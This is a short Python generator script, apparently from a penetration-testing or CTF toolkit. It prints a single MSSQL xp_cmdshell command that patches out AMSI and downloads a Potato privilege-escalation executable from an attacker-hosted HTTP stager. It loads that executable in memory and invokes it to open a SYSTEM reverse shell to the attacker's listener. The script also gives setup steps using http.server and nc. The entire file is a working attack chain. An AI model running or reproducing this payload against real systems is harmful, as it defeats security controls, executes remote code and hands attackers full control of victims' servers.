#!/usr/bin/env python3
"""Variant A -- HTTP cradle (egress open, ONE line).
AMSI byte-patch + reflective load of the Potato exe from your HTTP stager + invoke revshell-as-SYSTEM.
Edit LHOST/LPORT/TOOL in _winpriv_common.py. Serve the exe (python3 -m http.server 80) + nc -lvnp first.

Usage: python3 gen_full.py
"""
import _winpriv_common as P

STAGER = f"http://{P.LHOST}/{P.TOOL}"     # serve this exact exe from the attacker; match the .NET build

arr = P.ps_argv_literal(P.TOOL)
load = (f"$x=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('{STAGER}'));"
        f"$x.EntryPoint.Invoke($null,@(,[string[]]@({arr})))")
full_b64 = P.utf16b64(P.AMSI + load)

print(f"-- tool={P.TOOL}  revshell={P.LHOST}:{P.LPORT}  stager={STAGER}")
print(f"-- prep: put {P.TOOL} in the http.server dir; `sudo python3 -m http.server 80`; `nc -lvnp {P.LPORT}`")
print("-- then run this single line in your MSSQL shell:")
print(f"EXEC master..xp_cmdshell 'powershell -ep bypass -e {full_b64}';")
print(f"\n-- (outer b64 len: {len(full_b64)}  |  fits the 8191 cmd-line limit)")
